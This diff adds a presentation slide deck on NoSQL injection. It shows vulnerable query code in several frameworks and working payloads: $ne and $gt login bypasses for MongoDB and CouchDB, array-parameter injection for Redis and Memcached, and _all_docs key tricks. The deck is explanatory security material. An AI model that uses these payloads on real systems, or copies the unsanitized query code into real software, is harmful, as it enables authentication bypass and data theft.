@@ -1,0 +1,231 @@
+<section>
+
+  <!-- Chapter slide -->
+  <section>
+    <h3><blue>Injection Attacks</blue></h3>    <br>
+    <h3><span class="fa-stack fa-lg">
+      <i class="fa fa-square fa-stack-2x"></i>
+      <i class="fa fa-flash fa-stack-1x fa-inverse" style="line-height: 2em"></i>
+    </span></h3>
+  </section>
+  
+  <!-- What's the problem -->
+  <section>
+    <h3>What's already <blue>known</blue>?</h3><br>
+    <p>
+      <span class="fragment">Login bypass for <strong>MongoDB</strong> on PHP and NodeJS</span><br><br>
+      <span class="fragment">String concatenation is still an issue for <strong>JSON and script</strong> parameters</span><br><br>
+      <span class="fragment">Escaping flaws of drivers e.g. <strong>Memcached</strong><br> Got fixed!</span>
+    </p>
+  </section>
+
+  <!-- Attacks - MongoDB - NodeJS Login Bypass? -->
+  <section>
+    <h4><blue>MongoDB</blue> - Login Bypass</h4>
+<pre class="fragment" data-fragment-index="1"><code class="javascript" data-trim data-noescape>
+// NodeJS with Express.js
+db.collection('users').find({
+  "user": <span class="fragment highlight-current-blue" data-fragment-index="3">req.query.user</span>, 
+  "password": <span class="fragment highlight-current-blue" data-fragment-index="3">req.query.password</span>
+});
+</code></pre>
+
+<code class="fragment code" data-fragment-index="2">
+<blue><i class="fa fa-check"></i></blue> https://example.org/login?user=<span class="fragment highlight-current-blue" data-fragment-index="3">patrick</span>&password=<span class="fragment highlight-current-blue" data-fragment-index="3">1234</span>
+</code><br>
+
+<code class="fragment code" data-fragment-index="4">
+<blue><i class="fa fa-flash"></i></blue> https://example.org/login?user=<span class="fragment highlight-blue" data-fragment-index="5">patrick</span>&password<span class="fragment highlight-blue" data-fragment-index="5">[%24ne]=</span>
+</code>
+
+<pre class="fragment" data-fragment-index="6"><code class="javascript" data-trim data-noescape>
+// NodeJS with <mark class="fragment" data-fragment-index="7">Express.js</mark>
+db.collection('users').find({
+  "user": <span class="fragment" data-fragment-index="8">"patrick"</span>, 
+  "password": <span class="fragment" data-fragment-index="8">{"&ne": ""}</span>
+});
+</code></pre>
+
+  </section>
+
+  <!-- Attacks -  Query selector injection on all platforms -->
+  <section>
+    <h4><blue>MongoDB</blue> - Login Bypass</h4>
+<pre class="fragment"><code class="php" data-trim data-noescape>
+// PHP
+$collection->find(array(
+  'user' => $_GET['user'], 
+  'password' => $_GET['password']
+));
+</code></pre>
+
+<span class="caption fragment"><i class="fa fa-flash"></i> What's even new?</span class="caption">
+
+<pre class="fragment"><code class="ruby" data-trim data-noescape>
+# Ruby on Rails
+db['users'].find({
+  :user => req.params['user'], 
+  :password => req.params['password']
+})
+</code></pre>
+<pre class="fragment"><code class="python" data-trim data-noescape>
+# Python with Django
+db.users.find({
+  "user": request.GET['user'], 
+  "password": request.GET['password']
+})
+</code></pre>
+  </section>
+
+  <!-- Attacks -  Query selector with POST-->
+  <section>
+    <h4><blue>MongoDB</blue> - Login Bypass</h4>
+
+<span class="caption fragment">... also works for POST requests!</span class="caption">
+<pre class="fragment"><code data-trim data-noescape>
+POST /login HTTP/1.1
+Host: example.org
+Content-Type: application/json
+Content-Length: 38
+
+{'user': 'patrick', <mark class="fragment">'password': {'&amp;gt': ''}</mark>}
+</code></pre>
+
+<pre class="fragment"><code data-trim data-noescape>
+POST /login HTTP/1.1
+Host: example.org
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+
+user=Patrick&<mark class="fragment">password[%24ne]=</mark>
+</code></pre>
+  </section>
+
+  <!-- Attacks - Redis - Parameter overwrite injection -->
+  <section>
+    <h4 ><blue>Redis</blue> - Parameter Overwrite Injection</h4>
+    <span class="caption fragment" data-fragment-index="1">... just a key-value store - what's the worst that could happen?</span class="caption">
+<pre class="fragment" data-fragment-index="2"><code class="javascript" data-trim data-noescape>
+// NodeJS with Express.js
+RedisClient.expireat(
+  <span class="fragment highlight-blue" data-fragment-index="5">req.query.key</span>, 
+  new Date("November 8, 2026 11:13:00").getTime()
+);
+</code></pre>
+
+<code class="fragment code" data-fragment-index="3">
+<blue><i class="fa fa-flash"></i></blue> .../expire?key<span class="fragment highlight-blue" data-fragment-index="4">[]=foo</span>&<span class="fragment highlight-blue" data-fragment-index="4">key[]=1117542887</span></span>
+</code>
+<br><br>
+<p class="fragment" data-fragment-index="6">Injected array overwrites all following parameters of <strong>each database function</strong>!</p>
+<p class="fragment" data-fragment-index="7">Only NodeJS driver affected!</p>
+
+  </section>
+
+  <!-- Attacks - CouchDB - Special key injection -->
+  <section>
+    <h4><blue>CouchDB</blue> - Login Bypass</h4>
+<pre class="fragment" data-fragment-index="1"><code class="javascript" data-trim data-noescape>
+// NodeJS with Express.js
+function checkCredentials(user, password, callback) {
+  var options = {'selector': {'user': user, 'password': <span class="fragment highlight-blue" data-fragment-index="3">password</span>}}; 
+  couch.use('users').get('_find', options, (err, res) => {
+    callback(res.docs.length === 1);
+  });
+
+checkCredentials(req.query.user, req.query.password, handleResult);
+</code></pre>
+
+<code class="fragment code" data-fragment-index="2">
+<blue><i class="fa fa-flash"></i></blue> login?user=patrick&password<span class="fragment highlight-blue" data-fragment-index="3">[%24ne]=</span>
+</code>
+<br></br>
+<p class="fragment" data-fragment-index="4">Inject <strong>query selector</strong> to bypass password check!</p>
+
+  </section>
+
+  <!-- Attacks - CouchDB - Special key injection -->
+  <section>
+    <h4><blue>CouchDB</blue> - Login Bypass</h4>
+    <span class="caption fragment" data-fragment-index="0">... then let's check the password within the application layer!</span class="caption">
+<pre class="fragment" data-fragment-index="1"><code class="javascript" data-trim data-noescape>
+// NodeJS with Express.js
+function checkCredentials(user, password, callback) {
+  nano.use('users').get(<span class="fragment highlight-blue" data-fragment-index="3">user</span>, (err, res)=> {
+    callback(res.password === <span class="fragment highlight-blue" data-fragment-index="3">paasword</span>);
+  });
+}
+
+checkUser(req.query.user, req.query.password, handleResult);
+</code></pre>
+
+<code class="fragment code" data-fragment-index="2">
+<blue><i class="fa fa-flash"></i></blue> https://example.org/login?user=<span class="fragment highlight-blue" data-fragment-index="3">_all_docs</span>
+</code>
+<br></br>
+<p class="fragment" data-fragment-index="4">Use special <strong>_all_docs</strong> document with undefined password property!</p>
+
+  </section>
+
+
+
+  <!-- Attacks - CouchDB - Array key injection -->
+  <section>
+    <h4><blue>CouchDB</blue> - Check Bypass</h4>
+    <span class="caption fragment" data-fragment-index="0">Hmm ... then let's check the properties!</span class="caption">
+<pre class="fragment" data-fragment-index="1"><code class="javascript" data-trim data-noescape>
+// NodeJS with Express.js
+function getDocument(key, callback) {
+  if (<span class="fragment highlight-blue" data-fragment-index="4">key</span> === "secretDoc" || <span class="fragment highlight-blue" data-fragment-index="4">key[0]</span> === "_") {
+    callback("Not authorized!");
+  } else {
+    couch.use('documents').get(key, callback);
+  }
+}
+
+getDocument(req.query.key);
+</code></pre>
+
+<code class="fragment code" data-fragment-index="2">
+<blue><i class="fa fa-flash"></i></blue> https://example.org/get?user<span class="fragment highlight-blue" data-fragment-index="3">[]=secretDoc</span><br>
+<blue><i class="fa fa-flash"></i></blue> https://example.org/get?user<span class="fragment highlight-blue" data-fragment-index="3">[]=_all_docs</span>
+</code>
+  </section>
+
+  <!-- ######################## Memcached ######################## -->
+  <section>
+    <h4><blue>Memcached</blue> - Array Injection</h4>
+<pre><code class="javascript" data-trim data-noescape>
+function getCache(key) {
+  if (<span class="fragment highlight-blue" data-fragment-index="4">key</span>.indexOf('auth_') === 0){
+    callback("Invalid key!"); 
+  } else {
+    memcached.get(key, (err, body)=>{
+      callback(err || body); 
+    });
+  }
+}
+
+getCache(req.query.key, handleResult);
+</code></pre>
+
+<code class="fragment code" data-fragment-index="2">
+<blue><i class="fa fa-flash"></i></blue> https://example.org?/getCache?key<span class="fragment highlight-blue" data-fragment-index="3">[]=auth_patrick</span>
+</code>
+<br><br>
+<p class="fragment">Array injection bypasses application layer checks!</p>
+
+  </section>
+
+  <!-- ######################## Summary ######################## -->
+  <section>
+    <h4><blue>Attack</blue> Summary</h4><br>
+
+    <p class="fragment">All attacks shown with <strong>GET</strong> requests also work with <strong>POST</strong> and <strong>PUT</strong> requests!</p><br>
+
+    <p class="fragment">Nearly all attacks work on <strong>NodeJS</strong>, <strong>PHP</strong>, <strong>Ruby</strong> and <strong>Python</strong> in combination with certain frameworks!</p><br>
+
+    <p class="fragment">Object and array injection changes <strong>semantics</strong> and is key for attacks!</p>
+
+  </section>
+</section>
